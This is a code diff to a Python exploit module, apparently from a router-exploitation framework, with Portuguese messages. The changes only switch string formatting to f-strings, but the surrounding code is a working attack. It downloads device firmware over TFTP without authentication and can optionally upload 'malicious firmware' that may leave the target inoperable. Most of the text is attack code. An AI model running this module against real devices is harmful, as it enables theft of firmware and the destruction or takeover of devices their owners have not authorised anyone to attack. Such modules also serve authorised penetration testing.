@@ -89,7 +89,7 @@ class Exploit(Exploit):
                 try:
                     raw, addr = sock.recvfrom(65535)
                 except socket.timeout:
-                    print_warning("Timeout aguardando bloco {} do servidor".format(expected_block))
+                    print_warning(f"Timeout aguardando bloco {expected_block} do servidor")
                     break
 
                 if server_addr is None:
@@ -102,7 +102,7 @@ class Exploit(Exploit):
                 if op == _TFTP_OP_ERROR:
                     errcode = struct.unpack("!H", raw[2:4])[0]
                     errmsg = raw[4:].rstrip(b"\x00").decode("utf-8", errors="replace")
-                    print_error("Erro TFTP {}: {}".format(errcode, errmsg))
+                    print_error(f"Erro TFTP {errcode}: {errmsg}")
                     return b""
 
                 if op == _TFTP_OP_DATA:
@@ -142,7 +142,7 @@ class Exploit(Exploit):
             op = struct.unpack("!H", raw[:2])[0]
             if op == _TFTP_OP_ERROR:
                 errcode = struct.unpack("!H", raw[2:4])[0]
-                print_error("Servidor recusou upload: código {}".format(errcode))
+                print_error(f"Servidor recusou upload: código {errcode}")
                 return 0
 
             block_num = 1
@@ -157,7 +157,7 @@ class Exploit(Exploit):
                     raw, _ = sock.recvfrom(65535)
                     acked_block = struct.unpack("!H", raw[2:4])[0] if len(raw) >= 4 else 0
                 except socket.timeout:
-                    print_warning("Timeout aguardando ACK {}".format(block_num))
+                    print_warning(f"Timeout aguardando ACK {block_num}")
                     break
 
                 if acked_block == block_num:
@@ -189,22 +189,21 @@ class Exploit(Exploit):
     @multi
     def run(self):
         """Download não autenticado de firmware + upload opcional."""
-        print_status("Tentando download TFTP: {}:{} -> {}".format(
-            self.target, self.port, self.remote_file))
+        print_status(f"Tentando download TFTP: {self.target}:{self.port} -> {self.remote_file}")
 
         firmware_data = self._tftp_download(str(self.remote_file), str(self.local_save_path))
 
         if firmware_data:
-            print_success("Download concluído: {} bytes".format(len(firmware_data)))
+            print_success(f"Download concluído: {len(firmware_data)} bytes")
             try:
                 with open(str(self.local_save_path), "wb") as f:
                     f.write(firmware_data)
-                print_success("Firmware salvo em: {}".format(self.local_save_path))
+                print_success(f"Firmware salvo em: {self.local_save_path}")
             except OSError as exc:
-                print_error("Erro ao salvar arquivo: {}".format(exc))
+                print_error(f"Erro ao salvar arquivo: {exc}")
 
             magic = firmware_data[:4].hex()
-            print_info("Magic bytes: {}".format(magic))
+            print_info(f"Magic bytes: {magic}")
             if firmware_data[:2] == b"MZ":
                 print_info("Detectado: PE Windows executable")
             elif firmware_data[:4] == b"\x7fELF":
@@ -221,19 +220,18 @@ class Exploit(Exploit):
         if self.upload_file:
             upload_path = str(self.upload_file)
             if not os.path.isfile(upload_path):
-                print_error("Arquivo de upload não encontrado: {}".format(upload_path))
+                print_error(f"Arquivo de upload não encontrado: {upload_path}")
                 return
 
             with open(upload_path, "rb") as f:
                 upload_data = f.read()
 
-            print_warning("Iniciando upload de firmware malicioso: {} ({} bytes)".format(
-                upload_path, len(upload_data)))
+            print_warning(f"Iniciando upload de firmware malicioso: {upload_path} ({len(upload_data)} bytes)")
             print_warning("Sobrescrita de firmware pode tornar o dispositivo inoperante!")
             sent = self._tftp_upload(str(self.remote_file), upload_data)
 
             if sent > 0:
-                print_success("Upload concluído: {} bytes enviados para {}".format(sent, self.target))
+                print_success(f"Upload concluído: {sent} bytes enviados para {self.target}")
                 print_warning("Dispositivo pode reiniciar com o novo firmware")
             else:
                 print_error("Upload falhou — servidor pode ter rejeitado WRQ")
